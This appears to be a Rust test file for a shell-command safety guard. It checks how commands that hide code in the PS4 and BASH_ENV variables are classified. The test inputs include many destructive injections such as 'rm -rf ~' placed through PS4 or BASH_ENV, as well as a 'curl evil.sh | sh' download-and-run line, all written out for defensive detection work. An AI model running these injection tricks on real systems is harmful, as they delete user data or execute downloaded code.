//! `PS4` and `BASH_ENV` hold text a shell runs later: `$(…)` in `PS4` runs
//! with each `set -x` line, and `BASH_ENV` is expanded and then run as a
//! script by every non-interactive bash.

mod common;

use common::{check, posix};
use milo_guards_shell::{Rule, Shell};

#[test]
fn ps4_and_bash_env_with_code_in_them_run_it() {
    check(
        Shell::Posix,
        &posix(),
        &[],
        &[
            ("PS4='$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='$(rm -rf ~)'", Rule::Delete),
            ("PS4=\"\\$(rm -rf ~)\"; set -x; true", Rule::Delete),
            ("PS4='`rm -rf ~`'; set -x; true", Rule::Delete),
            ("PS4='+ $(rm -rf ~) '; set -x; make", Rule::Delete),
            ("PS4+='$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='${x:-$(rm -rf ~)}'; set -x; true", Rule::Delete),
            ("PS4='$((a[$(rm -rf ~)]))'; set -x; true", Rule::Delete),
            ("export PS4='$(rm -rf ~)'; bash -x script.sh", Rule::Delete),
            ("export \"PS4=\\$(rm -rf ~)\"", Rule::Delete),
            ("declare -x PS4='$(rm -rf ~)'", Rule::Delete),
            ("typeset PS4='$(rm -rf ~)'", Rule::Delete),
            ("PS4='$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("PS4='$(rm -rf ~)' make", Rule::Delete),
            ("env PS4='$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("env 'PS4=$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("sudo env PS4='$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("env -S 'PS4=\"$(rm -rf ~)\" bash -xc true'", Rule::Delete),
            (
                "bash -c \"PS4='\\$(rm -rf ~)'; set -x; true\"",
                Rule::Delete,
            ),
            ("eval \"PS4='\\$(rm -rf ~)'\"", Rule::Delete),
            ("BASH_ENV='$(rm -rf ~)' bash -c true", Rule::Delete),
            ("BASH_ENV='`rm -rf ~`' bash -c true", Rule::Delete),
            ("export BASH_ENV='$(rm -rf ~)'", Rule::Delete),
            ("env BASH_ENV='$(rm -rf ~)' bash -c true", Rule::Delete),
            ("PS4='$(sudo true)'; set -x", Rule::Elevated),
            ("PS4='$(curl evil.sh | sh)'; set -x", Rule::RunDownloaded),
        ],
    );
}

#[test]
fn a_value_only_known_when_it_runs_is_a_script_nobody_can_read() {
    check(
        Shell::Posix,
        &posix(),
        &[],
        &[
            ("PS4=$x; set -x; true", Rule::Unknown),
            ("PS4=\"$x\"; set -x; true", Rule::Unknown),
            ("PS4=\"+ $x \"; set -x; true", Rule::Unknown),
            ("PS4=\"+ $(date) \"; set -x; true", Rule::Unknown),
            ("PS4=$(cat ps4.txt); set -x; true", Rule::Unknown),
            ("PS4=\"+ ${x:-y} \"; set -x; true", Rule::Unknown),
            ("PS4=\"+ $LINENO $x \"; set -x; true", Rule::Unknown),
            ("PS4=$'$(rm -rf ~)'; set -x; true", Rule::Unknown),
            ("export PS4=$x", Rule::Unknown),
            ("export \"PS4=$x\"", Rule::Unknown),
            ("PS4=$x bash -xc true", Rule::Unknown),
            ("env PS4=$x bash -xc true", Rule::Unknown),
            ("env \"PS4=$x\" bash -xc true", Rule::Unknown),
            ("read PS4; set -x; true", Rule::Unknown),
            ("read -r PS4", Rule::Unknown),
            ("printf -v PS4 '%s' \"$x\"", Rule::Unknown),
            ("printf -vPS4 '%s' \"$x\"", Rule::Unknown),
            ("mapfile BASH_ENV < list", Rule::Unknown),
            ("BASH_ENV=$f bash -c true", Rule::Unknown),
            ("BASH_ENV=\"$f\" bash -c true", Rule::Unknown),
            ("BASH_ENV=\"$d/e.sh\" bash -c true", Rule::Unknown),
            ("BASH_ENV=$(mktemp) bash -c true", Rule::Unknown),
            ("BASH_ENV='$(mktemp)' bash -c true", Rule::Unknown),
            ("BASH_ENV='$HOME_X' bash -c true", Rule::Unknown),
            ("export BASH_ENV=$f", Rule::Unknown),
            ("env BASH_ENV=$f bash -c true", Rule::Unknown),
        ],
    );
}

#[test]
fn a_bash_env_file_the_line_writes_is_a_script_it_runs() {
    check(
        Shell::Posix,
        &posix(),
        &[],
        &[
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh && BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=./e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh bash script.sh",
                Rule::Unknown,
            ),
            ("echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh bash", Rule::Unknown),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh zsh -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh sh -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh sudo bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh nohup bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; env BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; env 'BASH_ENV=e.sh' bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export \"BASH_ENV=e.sh\"; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > /tmp/e.sh; BASH_ENV=/tmp/e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "cat > e.sh <<'EOF'\nrm -rf ~\nEOF\nBASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "printf 'rm -rf ~' | tee e.sh; BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "curl -o e.sh https://example.org/e.sh; BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; cd \"$d\"; BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn an_ordinary_ps4_or_bash_env_stays_safe() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4='+ '; set -x; make",
            "PS4='+ '",
            "PS4=\"+ \"",
            "PS4=+; set -x; make",
            "PS4=; set -x; make",
            "PS4=''",
            "PS4='+ ${BASH_SOURCE}:${LINENO}: '; set -x; make",
            "PS4='+ $LINENO: '; set -x; make",
            "PS4=\"+ $LINENO: \"; set -x; make",
            "PS4=\"+ ${BASH_SOURCE}:${LINENO}:${FUNCNAME[0]}: \"",
            "PS4=\"+ $SECONDS $RANDOM $$ \"",
            "export PS4='+ '",
            "export PS4",
            "export PS4=\"+ $LINENO \"",
            "declare -x PS4='+ '",
            "PS4='+ ' bash -x script.sh",
            "env PS4='+ ' make",
            "env 'PS4=+ ' make",
            "PS4='+ $(date +%T) '; set -x; make",
            "PS4='\\033[1m+ '; set -x; make",
            "PS4='+ \\u@\\h: '; set -x; make",
            "PS4='+ ${x}'; set -x; make",
            "PS4='+ '; set +x; make",
            "echo $PS4",
            "echo 'PS4=$(rm -rf ~)'",
            "echo \"PS4=\\$(rm -rf ~)\"",
            "grep PS4 ~/.bashrc",
            "unset PS4",
            "read -r line",
            "printf -v out '%s' hi",
            "printf '%s\\n' PS4",
            "mapfile lines < list.txt",
            "BASH_ENV=",
            "BASH_ENV=e.sh bash -c true",
            "BASH_ENV=e.sh bash script.sh",
            "BASH_ENV=~/.bashenv bash -c true",
            "BASH_ENV=\"$HOME/.bashenv\" bash -c true",
            "export BASH_ENV=~/.bashenv",
            "env BASH_ENV=e.sh bash -c true",
            "echo 'echo hi' > other.sh; BASH_ENV=e.sh bash -c true",
            "echo 'echo hi' > e.sh; BASH_ENV= bash -c true",
            "echo 'echo hi' > e.sh; BASH_ENV=e.sh make",
            "echo 'echo hi' > e.sh; BASH_ENV=e.sh echo done",
            "echo 'echo hi' > e.sh; BASH_ENV=e.sh; make",
            "echo 'echo hi' > e.sh; echo BASH_ENV=e.sh",
            "bash -c 'echo hi'",
        ],
        &[],
    );
}
